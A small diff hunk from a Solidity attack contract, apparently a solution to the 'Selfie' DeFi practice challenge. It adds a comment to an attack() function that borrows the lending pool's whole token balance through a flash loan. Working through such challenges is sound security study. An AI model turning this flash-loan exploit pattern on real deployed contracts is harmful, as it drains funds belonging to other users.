@@ -12,6 +12,9 @@ contract AttackSelfie {
         owner = _owner;
     }
 
+    /**
+     *  @dev we get a flashloan and ask for the whole balance of the pool.
+     */
     function attack() public {
         uint256 amountToBorrow = pool.token().balanceOf(address(pool));
         pool.flashLoan(amountToBorrow);
